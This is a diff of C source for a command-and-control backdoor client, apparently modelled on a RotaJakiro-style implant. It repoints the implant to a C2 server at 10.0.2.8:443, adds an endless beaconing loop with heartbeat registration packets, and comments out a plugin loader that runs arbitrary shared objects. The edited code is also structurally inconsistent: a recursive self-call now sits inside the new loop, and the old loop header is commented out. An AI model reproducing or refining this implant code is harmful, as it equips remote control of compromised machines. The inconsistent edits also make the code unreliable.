@@ -21,9 +21,10 @@ void c2_loop() {
 
     int sleepy_time = 3; // default C2 sleep time
     int sock;
-    int counter;
-    const char* server_name = "10.10.2.228";
-    const int server_port = 1443;
+		bool first_pkt = true;
+    //int counter;
+    const char* server_name = "10.0.2.8";
+    const int server_port = 443;
 
     // setup sockets for initial packet
     struct sockaddr_in server_address;
@@ -32,7 +33,9 @@ void c2_loop() {
     inet_pton(AF_INET, server_name, &server_address.sin_addr);
     server_address.sin_port = htons(server_port);
 
-    // on failure of connect/socket create, sleep and recrusively call ourselves.
+
+    // interactive c2 loop
+    while (1) {
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         fprintf(stderr, "could not create socket\n");
         sleep(3);
@@ -45,13 +48,23 @@ void c2_loop() {
         c2_loop();
     }
 
-    // initial pkt registration
-    char *initial_pkt = initial_rota_pkt();
-	send(sock, initial_pkt, 82, 0);
+
+		if (first_pkt == false) {
+						// initial pkt registration
+				char *initial_pkt = initial_rota_pkt();
+			memcpy(&initial_pkt[14], &rota_c2_heartbeat, 4);
+			send(sock, initial_pkt, 82, 0);
+		} else {
+	    // initial pkt registration
+			first_pkt = false;
+			char *initial_pkt = initial_rota_pkt();
+			send(sock, initial_pkt, 82, 0);
+
+		}
 
     // interactive c2 loop
-    while (1) {
-        int i = 0;
+    //while (1) {
+        //int i = 0;
         printf("(%d) In c2 loop...\n", getpid());
 
         // receive
@@ -237,7 +250,6 @@ void c2_loop() {
         sleep(sleepy_time);
     }
 
-    free(initial_pkt);
     close(sock);
     exit(0);
 }
@@ -381,11 +393,11 @@ bool c2_delete_file(char *fpath) {
 
 void c2_run_plugin_1(char *soPath, char *funcName) {
 
-    void *handle = dlopen(soPath, RTLD_LAZY);
-    void (*func_ptr)() = dlsym(handle, funcName);
+    //void *handle = dlopen(soPath, RTLD_LAZY);
+    //void (*func_ptr)() = dlsym(handle, funcName);
     // execution of shared object
-    func_ptr();
-    dlclose(handle);
+    //func_ptr();
+    //dlclose(handle);
 }
 
 
